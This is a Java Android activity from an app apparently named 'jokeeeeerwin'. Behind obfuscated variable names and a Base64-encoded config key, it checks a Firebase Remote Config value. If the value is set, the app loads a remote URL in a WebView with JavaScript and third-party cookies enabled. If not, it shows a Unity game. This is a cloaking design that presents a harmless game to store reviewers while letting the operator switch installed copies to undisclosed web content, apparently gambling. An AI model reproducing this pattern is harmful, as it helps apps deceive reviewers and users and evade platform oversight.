package com.jokeeeeerwin.in.app.win_main;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.ProgressBar;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.jokeeeeerwin.in.app.R;
import com.jokeeeeerwin.in.app.win_const.WinInConst;
import com.jokeeeeerwin.in.app.win_reciever.WinInReciever;
import com.jokeeeeerwin.in.app.win_webs.WinInChromeClient;
import com.jokeeeeerwin.in.app.win_webs.WinInWebClient;
import com.unity3d.player.UnityPlayerActivity;

public class WinView extends AppCompatActivity {

    FirebaseRemoteConfig yfYGa5Y44B2m;
    ProgressBar x8n39yD4uSXT;
    WebView jKdjzB7B967V;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.win_view);

        x8n39yD4uSXT = findViewById(R.id.win_progress);
        jKdjzB7B967V = findViewById(R.id.win_view);

        yfYGa5Y44B2m = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings win_FirebaseRometeConfigSettings = new FirebaseRemoteConfigSettings.Builder().build();
        yfYGa5Y44B2m.setDefaultsAsync(R.xml.win_url);
        yfYGa5Y44B2m.setConfigSettingsAsync(win_FirebaseRometeConfigSettings);


        try {
            Thread.sleep(1500);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        if(!yfYGa5Y44B2m.getString(new String(android.util.Base64.decode("d2luX3VybA==", Base64.DEFAULT)))
                .equals(new String(Base64.decode("d2luX3VybA==", Base64.DEFAULT))))
        {
            CookieManager win_CookieManager = CookieManager.getInstance();
            CookieManager.setAcceptFileSchemeCookies(true);
            win_CookieManager.setAcceptThirdPartyCookies(jKdjzB7B967V, true);

            jKdjzB7B967V.getSettings().setJavaScriptEnabled(true);
            jKdjzB7B967V.getSettings().setSupportZoom(true);
            jKdjzB7B967V.getSettings().setBuiltInZoomControls(false);
            jKdjzB7B967V.getSettings().setLoadWithOverviewMode(true);
            jKdjzB7B967V.getSettings().setDomStorageEnabled(true);
            jKdjzB7B967V.getSettings().setUseWideViewPort(true);
            jKdjzB7B967V.getSettings().setLoadsImagesAutomatically(true);
            jKdjzB7B967V.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            jKdjzB7B967V.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            jKdjzB7B967V.setBackgroundColor(Color.WHITE);
            jKdjzB7B967V.loadUrl(yfYGa5Y44B2m.getString(new String(Base64.decode("d2luX3VybA==", Base64.DEFAULT))));

            jKdjzB7B967V.setWebViewClient(new WinInWebClient());
            jKdjzB7B967V.setWebChromeClient(new WinInChromeClient(this, x8n39yD4uSXT));

            WinInReciever winInReciever = new WinInReciever(jKdjzB7B967V);
            IntentFilter winIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
            winIntentFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
            registerReceiver(winInReciever, winIntentFilter);

        }
        else {
            Intent i = new Intent(this, UnityPlayerActivity.class);
            startActivity(i);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode == WinInConst.reqCode)
            if (WinInConst.winCallBac == null) return;

        if (resultCode != RESULT_OK) {
            WinInConst.winCallBac.onReceiveValue(null);
            return;
        }

        Uri winResult = (data == null) ? WinInConst.winUrl : data.getData();

        if (winResult != null && WinInConst.winCallBac != null)
            WinInConst.winCallBac.onReceiveValue(new Uri[]{winResult});
        else if (WinInConst.winCallBac != null)
            WinInConst.winCallBac.onReceiveValue(new Uri[]{WinInConst.winUrl});
        WinInConst.winCallBac = null;
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onBackPressed() {
        if(jKdjzB7B967V.canGoBack()) jKdjzB7B967V.goBack();
    }
}